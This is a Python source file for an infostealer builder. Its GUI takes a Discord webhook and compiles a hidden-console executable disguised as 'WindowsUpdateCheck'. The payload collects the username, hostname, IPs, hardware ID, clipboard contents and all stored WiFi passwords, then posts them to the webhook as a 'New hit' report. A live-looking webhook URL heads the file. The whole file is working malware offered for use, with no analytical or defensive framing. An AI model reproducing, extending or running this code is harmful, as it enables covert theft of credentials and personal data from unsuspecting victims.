https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO


import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk
import shutil
import tempfile
import textwrap
import requests

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook, json={"content": "Stealer test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in [200, 204]:
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Stealer Builder - Back to Working Basics + Extras")
    root.geometry("600x320")
    root.resizable(False, False)
    
    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
    webhook_entry = tk.Entry(root, width=80)
    webhook_entry.pack(pady=5)
    
    def run_test():
        hook = webhook_entry.get().strip()
        success, msg = test_webhook(hook)
        if success:
            messagebox.showinfo("OK", msg)
        else:
            messagebox.showerror("Failed", msg)
    
    tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
    
    progress = ttk.Progressbar(root, mode="indeterminate")
    
    def build():
        webhook = webhook_entry.get().strip()
        if not webhook or "discord.com/api/webhooks" not in webhook:
            messagebox.showerror("Nope", "Valid webhook required.")
            return
        
        progress.pack(pady=15)
        progress.start()
        root.update()
        
        try:
            generate_malware(webhook)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", 
                "stealer.exe ready!\n\n"
                "Back to your ORIGINAL working exfil method (proven to send).\n"
                "Now grabs:\n"
                "â€¢ Full basic recon (HWID, IP, username, etc)\n"
                "â€¢ All stored WiFi passwords\n"
                "â€¢ Clipboard content\n\n"
                "Sends as .txt file + fallback text. Zero pywin32 = zero crashes.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"Build failed:\n{str(e)}")
        root.destroy()
    
    tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
    root.mainloop()

# =================== WORKING PAYLOAD - NO PYWIN32 ===================
stealer_code = textwrap.dedent('''
import os
import subprocess
import socket
import requests
import platform
import uuid
import ctypes
import time
from datetime import datetime

WEBHOOK = "{WEBHOOK_PLACEHOLDER}"

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "Failed"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Failed"

def get_hwid():
    try:
        return subprocess.check_output("wmic csproduct get uuid", shell=True, text=True).split('\\n')[1].strip()
    except:
        return str(uuid.getnode())

def get_clipboard():
    try:
        CF_TEXT = 1
        user32 = ctypes.windll.user32
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            handle = user32.GetClipboardData(CF_TEXT)
            data = ctypes.c_char_p(handle).value.decode('utf-8', errors='ignore')
        else:
            data = "No text in clipboard"
        user32.CloseClipboard()
        return data
    except:
        return "Clipboard access failed"

def get_wifi_passwords():
    wifi = []
    try:
        profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True, errors='ignore').decode('utf-8', errors='ignore')
        profile_names = [line.split(":")[1].strip() for line in profiles.split('\\n') if "All User Profile" in line]
        for profile in profile_names:
            try:
                result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], text=True, errors='ignore').decode('utf-8', errors='ignore')
                key = [line.split(":")[1].strip() for line in result.split('\\n') if "Key Content" in line]
                if key:
                    wifi.append(f"{profile}: {key[0]}")
            except:
                pass
        return "\\n".join(wifi) if wifi else "No WiFi profiles or failed"
    except:
        return "WiFi grab failed"

def exfil():
    time.sleep(5)
    
    data = f"""\
FULL REPORT - {datetime.utcnow().isoformat()} UTC
==================================================
Username       : {os.getenv("USERNAME")}
Computer Name  : {platform.node()}
OS             : {platform.system()} {platform.release()} ({platform.version()})
HWID           : {get_hwid()}
Public IP      : {get_public_ip()}
Local IP       : {get_local_ip()}
Clipboard      : {get_clipboard()}

Stored WiFi Passwords:
{get_wifi_passwords()}
"""
    temp_file = os.path.join(os.getenv("TEMP"), "system_check.txt")
    
    try:
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(data)
        
        with open(temp_file, "rb") as f:
            files = {"file": ("report.txt", f)}
            payload = {"content": f"**New hit** - {os.getenv('USERNAME')}@{platform.node()}"}
            requests.post(WEBHOOK, data=payload, files=files, timeout=30)
    except:
        try:
            requests.post(WEBHOOK, json={"content": f"**Fallback Report**\\n```\\n{data}\\n```"})
        except:
            pass
    finally:
        try:
            os.remove(temp_file)
        except:
            pass

exfil()

while True:
    time.sleep(3600)
''')

# =================== BUILD ===================
def generate_malware(webhook):
    temp_dir = tempfile.mkdtemp()
    script_path = os.path.join(temp_dir, "payload.py")
    
    try:
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook))
        
        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--name", "WindowsUpdateCheck",
            script_path
        ]
        
        result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"PyInstaller failed:\\n{result.stderr}")
        
        built_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
        final_exe = os.path.join(os.getcwd(), "stealer.exe")
        shutil.copyfile(built_exe, final_exe)
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)  # No leftovers

    print(f"Working stealer built: {final_exe}")

if __name__ == "__main__":
    get_webhook()
